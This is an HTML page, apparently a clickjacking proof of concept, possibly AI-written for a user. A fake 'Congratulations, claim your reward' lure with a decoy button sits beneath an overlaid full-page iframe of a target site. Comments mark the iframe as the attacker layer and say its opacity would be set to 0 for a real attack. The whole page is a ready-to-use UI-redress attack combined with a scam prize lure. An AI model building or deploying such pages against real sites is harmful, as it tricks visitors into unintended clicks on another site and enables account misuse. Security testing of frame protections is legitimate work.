<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exclusive Reward Center</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #FF4757;
            --secondary: #2F3542;
            --accent: #ECCC68;
            --bg: #F1F2F6;
            --card-bg: #FFFFFF;
        }

        body {
            font-family: 'Outfit', sans-serif;
            background-color: var(--bg);
            color: var(--secondary);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        .container {
            background-color: var(--card-bg);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 500px;
            width: 90%;
            z-index: 1;
            /* Below the iframe, but above background */
        }

        h1 {
            color: var(--primary);
            font-size: 2.5rem;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        p {
            font-size: 1.1rem;
            margin-bottom: 30px;
            color: #747d8c;
        }

        .cta-button {
            background: linear-gradient(135deg, var(--primary), #FF6B81);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.2rem;
            font-weight: 800;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 10px 20px rgba(255, 71, 87, 0.3);
            transition: transform 0.2s, box-shadow 0.2s;
            position: relative;
            overflow: hidden;
        }

        .cta-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 25px rgba(255, 71, 87, 0.4);
        }

        .cta-button::after {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
            transition: 0.5s;
        }

        .cta-button:hover::after {
            left: 100%;
        }

        /* The Clickjacking Iframe */
        .iframe-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0.3;
            /* Low opacity to show demonstration, 0 for real attack */
            z-index: 9999;
            /* Highest layer */
        }

        .badge {
            background-color: var(--accent);
            color: var(--secondary);
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.9rem;
            display: inline-block;
            margin-bottom: 15px;
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="badge">LIMITED TIME OFFER</div>
        <h1>Congratulations!</h1>
        <p>You've been selected to receive an exclusive reward. Click the button below to claim your prize instantly!
        </p>

        <!-- The visual decoy button -->
        <button class="cta-button">CLAIM REWARD NOW</button>
    </div>

    <!-- The invisible attacker framing the target site -->
    <!-- Pointing to the target requested by user -->
    <iframe class="iframe-overlay" src="https://dashsecurity.netlify.app"></iframe>

</body>

</html>
